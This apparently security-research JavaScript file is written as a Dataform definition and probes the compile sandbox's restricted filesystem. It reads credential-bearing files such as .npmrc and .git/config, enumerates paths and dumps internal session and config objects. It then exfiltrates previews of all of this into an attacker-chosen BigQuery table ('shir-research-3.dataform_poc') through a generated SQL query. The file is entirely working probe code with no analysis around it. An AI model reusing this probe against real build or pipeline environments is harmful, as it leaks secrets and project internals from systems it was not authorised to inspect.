/**
 * Internal Filesystem Probe
 *
 * The restricted_fs blocks path traversal and external paths.
 * This probe focuses on reading files within the allowed sandbox.
 */

const probeId = `internal_fs_${Date.now()}`;
const results = {
  probeId: probeId,
  timestamp: new Date().toISOString(),
  fileReads: {},
  existsChecks: {},
  dirChecks: {}
};

// Collect all async results
const promises = [];

// ============================================
// Try reading internal files
// ============================================
const filesToRead = [
  // Files in current directory
  "package.json",
  "dataform.json",
  "workflow_settings.yaml",
  ".npmrc",
  // Files in definitions
  "definitions/simple_test.sqlx",
  "definitions/aaa_shared_worker_probe.js",
  "definitions/aah_restricted_fs_probe.js",
  // Try index files
  "index.js",
  "bundle.js",
  // node_modules
  "node_modules/@dataform/core/package.json",
  "node_modules/@dataform/core/index.js",
  // Hidden files
  ".git/config",
  ".git/HEAD",
  ".gitignore"
];

for (const file of filesToRead) {
  promises.push(new Promise((resolve) => {
    try {
      restricted_fs.readFile(file, (err, data) => {
        if (err) {
          results.fileReads[file] = { error: String(err) };
        } else {
          const content = String(data);
          results.fileReads[file] = {
            success: true,
            length: content.length,
            preview: content.substring(0, 500)
          };
        }
        resolve();
      });
    } catch (e) {
      results.fileReads[file] = { error: e.message };
      resolve();
    }
  }));
}

// ============================================
// Check which paths exist
// ============================================
const pathsToCheck = [
  ".",
  "definitions",
  "includes",
  "node_modules",
  "node_modules/@dataform",
  "node_modules/@dataform/core",
  ".git",
  "package.json",
  "dataform.json"
];

for (const checkPath of pathsToCheck) {
  promises.push(new Promise((resolve) => {
    try {
      restricted_fs.exists(checkPath, (exists) => {
        results.existsChecks[checkPath] = exists;
        resolve();
      });
    } catch (e) {
      results.existsChecks[checkPath] = { error: e.message };
      resolve();
    }
  }));
}

// ============================================
// Check which paths are directories
// ============================================
for (const checkPath of pathsToCheck) {
  promises.push(new Promise((resolve) => {
    try {
      restricted_fs.isDirectory(checkPath, (isDir) => {
        results.dirChecks[checkPath] = isDir;
        resolve();
      });
    } catch (e) {
      results.dirChecks[checkPath] = { error: e.message };
      resolve();
    }
  }));
}

// Wait for all async operations
Promise.all(promises).then(() => {
  // Results are populated, but SQL already ran
  // We need to log to console for debugging
  console.log("Internal FS Probe Results:", JSON.stringify(results, null, 2));
});

// ============================================
// Synchronous exploration
// ============================================

// Check core module
try {
  if (typeof core !== "undefined") {
    results.coreModule = {
      version: core.version,
      keys: Object.keys(core),
      compilerKeys: typeof core.compiler !== "undefined" ? Object.keys(core.compiler) : [],
      sessionKeys: typeof core.session !== "undefined" ? Object.keys(core.session) : []
    };
  }
} catch (e) {
  results.coreModule = { error: e.message };
}

// Check dataform object more deeply
try {
  results.dataformObj = {
    keys: Object.keys(dataform),
    projectConfig: dataform.projectConfig,
    frozen: Object.isFrozen(dataform.projectConfig),
    extensible: Object.isExtensible(dataform.projectConfig)
  };
} catch (e) {
  results.dataformObj = { error: e.message };
}

// Check _DF_SESSION more deeply
try {
  if (typeof _DF_SESSION !== "undefined") {
    results.dfSession = {
      rootDir: _DF_SESSION.rootDir,
      rootDirType: typeof _DF_SESSION.rootDir,
      rootDirLength: _DF_SESSION.rootDir?.length,
      canonicalProjectConfig: _DF_SESSION.canonicalProjectConfig,
      actionsCount: _DF_SESSION.actions?.length,
      actionNames: _DF_SESSION.actions?.slice(0, 10).map(a => a.name || a.target?.name)
    };
  }
} catch (e) {
  results.dfSession = { error: e.message };
}

// ============================================
// Store Results
// ============================================

dataform.projectConfig.defaultDatabase = "shir-research-3";
dataform.projectConfig.defaultSchema = "dataform_poc";

operate("internal_fs_results").queries([
  `-- Internal FS Probe - ${probeId}
   CREATE OR REPLACE TABLE \`shir-research-3.dataform_poc.internal_fs_probe\` AS
   SELECT
     '${probeId}' as probe_id,
     CURRENT_TIMESTAMP() as probe_time,
     '''${JSON.stringify(results, null, 2).replace(/'/g, "\\'")}''' as results_json`
]);
